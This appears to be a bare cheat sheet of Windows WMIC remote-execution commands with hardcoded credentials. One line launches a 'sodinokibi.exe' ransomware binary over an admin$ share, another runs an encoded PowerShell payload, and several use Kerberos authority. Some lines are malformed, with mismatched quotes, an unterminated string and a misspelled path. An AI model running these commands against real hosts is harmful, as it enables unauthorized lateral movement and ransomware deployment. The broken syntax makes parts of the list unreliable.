```
wmic /node:"5.0.0.20" /user:"dfir\user" /password:QWE123! qfe list
wmic /node:10.0.0.6 /user:administrator process call create "cmd.exe /c calc"
wmic /node:"5.0.0.20" /user:”dfir\user” /password:QWE123! process call create "\\5.0.0.20\admin$\sodinokibi.exe"
wmic /node:target.domain /user:domain\user /password:password process call create "C:\Windows\System32\calc.exe"
wmic /node:"web01" /user:"insomnia.io\Spider01" /password:"Spider01@" process call create "powershell -enc [...snip...]"


wmic /authority:"Kerberos: Domain DC_Hostname“ / DC_hostname process call create 
wmic /authority:"kerberos:insomnia.io\john" /node:insomnia.io  path win32_process call create calc.exe
wmic /authority:"kerberos:insomnia.io\john" /node:insomnia.io  "cmd /c ipconfig"
wmic /authority:"Kerberos:DOMAIN REMOTE" /node:REMOTE process call create " Windows System32 nodepad.exe
```
